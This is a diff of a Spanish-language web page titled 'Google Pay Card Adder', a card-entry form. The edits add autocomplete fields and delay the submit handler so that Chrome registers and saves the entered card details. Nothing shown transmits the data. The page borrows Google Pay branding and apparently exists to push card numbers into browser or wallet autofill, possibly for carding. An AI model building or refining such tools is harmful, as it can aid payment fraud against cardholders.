@@ -5,13 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Google Pay Card Adder | Zeus2298</title>
     <style>
-        /* FONDO GENERAL DEL SITIO */
         body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            margin: 0; padding: 0;
+            display: flex; justify-content: center; align-items: center;
             min-height: 100vh;
             font-family: 'Segoe UI', sans-serif;
             background-color: #000;
@@ -30,7 +26,6 @@
             z-index: 1;
         }
 
-        /* PANEL CENTRAL */
         .main-container {
             position: relative;
             z-index: 10;
@@ -46,13 +41,10 @@
             box-sizing: border-box;
         }
 
-        /* TARJETA CON FONDO cubo.gif */
         .card-view {
-            /* CAMBIO: Ahora usa tu GIF cubo.gif */
             background-image: url('cubo.gif');
             background-size: cover;
             background-position: center;
-            
             padding: 20px;
             border-radius: 12px;
             margin-bottom: 25px;
@@ -62,7 +54,6 @@
             overflow: hidden;
         }
 
-        /* CAPA OSCURA OPCIONAL PARA QUE LOS NÚMEROS RESALTEN SOBRE EL GIF */
         .card-view::after {
             content: '';
             position: absolute;
@@ -72,13 +63,11 @@
         }
 
         .chip {
-            width: 45px;
-            height: 32px;
+            width: 45px; height: 32px;
             background: linear-gradient(135deg, #ffd700, #b8860b);
             border-radius: 5px;
             margin-bottom: 25px;
-            position: relative;
-            z-index: 2;
+            position: relative; z-index: 2;
         }
 
         .card-number-display {
@@ -87,9 +76,7 @@
             color: white;
             font-family: monospace;
             margin-bottom: 15px;
-            position: relative;
-            z-index: 2;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+            position: relative; z-index: 2;
         }
 
         .card-text {
@@ -98,25 +85,17 @@
             line-height: 1.5;
             font-weight: bold;
             text-transform: uppercase;
-            position: relative;
-            z-index: 2;
+            position: relative; z-index: 2;
         }
 
-        /* FORMULARIO */
         label {
-            display: block;
-            text-align: left;
-            font-size: 11px;
-            color: #ccc;
-            margin-top: 20px;
-            font-weight: bold;
+            display: block; text-align: left;
+            font-size: 11px; color: #ccc;
+            margin-top: 15px; font-weight: bold;
             letter-spacing: 1.2px;
         }
 
-        label::before {
-            content: '▶ ';
-            font-size: 10px;
-        }
+        label::before { content: '▶ '; font-size: 10px; }
 
         input {
             width: 100%;
@@ -145,7 +124,7 @@
             color: white;
             font-weight: bold;
             cursor: pointer;
-            margin-top: 30px;
+            margin-top: 25px;
             text-transform: uppercase;
             font-size: 13px;
             letter-spacing: 1.5px;
@@ -165,27 +144,22 @@
             <div class="card-view">
                 <div class="chip"></div>
                 <div class="card-number-display">#### #### #### ####</div>
-                
                 <div style="display: flex; justify-content: space-between; align-items: flex-end;">
-                    <div class="card-text">
-                        ZEUS2298<br>
-                        PAGOS SEGURO
-                    </div>
-                    <div class="card-text" style="text-align: right; font-size: 10px;">
-                        EXP.<br>
-                        MM/AA
-                    </div>
+                    <div class="card-text">ZEUS2298<br>PAGOS SEGURO</div>
+                    <div class="card-text" style="text-align: right; font-size: 10px;">EXP.<br>MM/AA</div>
                 </div>
             </div>
             
             <form id="payForm">
+                <label>NOMBRE EN LA TARJETA</label>
+                <input type="text" name="cc-name" autocomplete="cc-name" placeholder="Nombre Apellido" required>
+
                 <label>NÚMERO DE TARJETA</label>
-                <input type="text" name="cc-number" placeholder="0000 0000 0000 0000" required>
+                <input type="text" name="cc-number" autocomplete="cc-number" inputmode="numeric" placeholder="0000 0000 0000 0000" required>
                 
                 <label>FECHA DE VENCIMIENTO</label>
-                <input type="text" name="cc-exp" id="expiry-input" placeholder="MM/AA" maxlength="5" required>
+                <input type="text" name="cc-exp" id="expiry-input" autocomplete="cc-exp" placeholder="MM/AA" maxlength="5" required>
 
-                <input type="hidden" name="cc-name" value="Titular">
                 <button type="submit">AGREGAR TARJETA</button>
             </form>
         </div>
@@ -198,18 +172,20 @@
 
 <script>
     document.getElementById('payForm').onsubmit = function(e) {
-        e.preventDefault();
-        document.getElementById('main-content').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
-        let count = 3;
-        const interval = setInterval(() => {
-            count--;
-            document.getElementById('countdown').innerText = count;
-            if (count === 0) {
-                clearInterval(interval);
-                window.location.reload(); 
-            }
-        }, 1000);
+        // No cancelamos el evento de inmediato para que Chrome lo registre
+        setTimeout(() => {
+            document.getElementById('main-content').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            let count = 3;
+            const interval = setInterval(() => {
+                count--;
+                document.getElementById('countdown').innerText = count;
+                if (count === 0) {
+                    clearInterval(interval);
+                    window.location.reload(); 
+                }
+            }, 1000);
+        }, 100);
     };
 
     document.getElementById('expiry-input').addEventListener('input', function(e) {
